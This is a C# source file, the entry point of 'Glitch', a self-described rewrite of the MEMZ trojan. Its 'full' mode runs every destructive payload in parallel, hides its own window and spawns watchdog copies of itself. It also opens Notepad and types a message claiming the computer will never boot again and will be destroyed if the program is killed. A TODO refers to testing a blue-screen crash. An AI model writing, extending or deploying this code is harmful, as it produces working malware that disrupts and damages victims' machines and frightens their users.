#define Watch_Dogs

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using GlitchPayloads;
#if Watch_Dogs
using System.Diagnostics;
using CC_Functions.W32;
#endif

namespace Glitch
{
    public class Program
    {
        private static readonly Random Rnd = new Random();
        public static List<MethodInfo>? payloads;

        public static void Main(string[] args)
        {
#if Watch_Dogs
            if (args.Length == 1 && args[0] == "wd")
            {
                WatchDog.Run();
                return;
            }
#endif
            args = args == null || args.Length == 0
                ? new[] {"form"}
                : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
            payloads = Assembly.GetAssembly(typeof(PayloadAttribute)).GetTypes()
                .Where(s => s.IsClass &&
                            s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                .SelectMany(s => s.GetMethods()).Where(s =>
                    !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                .OrderBy(s => s.GetPayloadName())
                .ToList();
            switch (args[0])
            {
                case "form":
                    Application.Run(new RunGUI());
                    break;
                case "list":
                    Console.WriteLine(
                        string.Join(Environment.NewLine, payloads.Select(s => s.GetPayloadName())));
                    break;
                case "full":
                    ShowNotepad();
                    payloads.ForEach(s => new Thread(() => s.Invoke(null, new object[0])).Start());
#if Watch_Dogs
                    Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
                    for (int i = 0; i < WatchDog.WDC; i++)
                        Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
#else
                    ShowKill();
#endif
                    break;
                case "run":
                    Console.WriteLine("Using payloads:");
                    payloads.Where(s => args.Skip(1).Any(a => s.GetPayloadName().ToLower() == a)).ToList().ForEach(
                        s =>
                        {
                            Console.WriteLine($"- {s.GetPayloadName()}");
                            new Thread(() => s.Invoke(null, new object[0])).Start();
                        });
                    ShowKill();
                    break;
                case "help":
                    ShowHelp();
                    break;
                default:
                    Console.WriteLine("Invalid operator");
                    ShowHelp();
                    break;
            }
        }

        private static void ShowKill()
        {
            Console.WriteLine("Press [ENTER] to kill");
            Console.ReadLine();
            Environment.Exit(0);
        }

        private static void ShowHelp()
        {
            Console.WriteLine("CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#"
#if DEBUG
                              + " - DEBUG BUILD"
#endif
            );
            Console.WriteLine("Usage: Glitch <command> [parameters]");
            Console.WriteLine("");
            Console.WriteLine("Commands:");
            Console.WriteLine("-   form: Shows a GUI to customize payloads (Memz Clean). Default.");
            Console.WriteLine("-   help: Displays this message");
            Console.WriteLine("-   list: Lists all payloads");
            Console.WriteLine("-   run:  Run only the payloads specified in parameters");
#if Watch_Dogs
            Console.WriteLine("-   full: Runs all payloads. Includes Watchdogs");
#else
            Console.WriteLine("-   full: Runs all payloads");
#endif
#if Watch_Dogs
            Console.WriteLine("-   wd:   This is used internally and should never be used from outside");
#endif
        }

        private static void ShowNotepad()
        {
            Process proc = Process.Start("notepad.exe");
            proc.WaitForInputIdle();
            Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
            string msg = @"YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.

Your computer won't boot up again,
so use it as long as you can!

:D

Trying to kill MEMZ will cause your system to be
destroyed instantly, so don't try it :D";
            SendKeys.SendWait(msg);
        }
    }
}

//TODO: Function to build custom payload collections
//TODO: Test BSOD